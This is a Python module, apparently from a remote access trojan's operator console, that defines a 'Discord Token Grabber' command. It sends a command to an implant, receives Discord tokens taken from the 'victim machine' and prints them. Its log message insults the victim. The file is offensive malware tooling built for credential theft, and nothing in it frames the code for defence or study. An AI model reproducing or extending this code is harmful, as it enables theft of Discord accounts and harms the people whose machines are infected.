from lib.debug import Debug, log, console
from lib.helper import safe_socket
from lib.Protocol.PacketType import PacketType
from rich import box
from rich.panel import Panel
import os, json

class module():
    def __init__(self):
        self.Command        = "token_grabber"
        self.Name           = "Discord Token Grabber"
        self.Description    = """This command extracts discord tokens from the victim machine."""
        self.Platform       = "multi"
    
    @safe_socket
    def _exec(self, dmos, baseMessageJSON, args):
        packetHashID = dmos.sendPacket(PacketType.Command, baseMessageJSON)

        log.info("Recieving tokens from betacuck ..//\n")
        lootJSON = json.loads(dmos.recvPacket(PacketType.Command, packetHashID).decode().rstrip('\x00'))

        
        for discord_client in lootJSON:
            if discord_client == "desktop_client":
                desktopTokens = []
                for token in lootJSON[discord_client]:
                    desktopTokens.append(token)

                console.print(Panel.fit("[spring_green1]{}".format("\n".join(list(set(desktopTokens)))), box=box.DOUBLE_EDGE, title="Desktop tokens"))


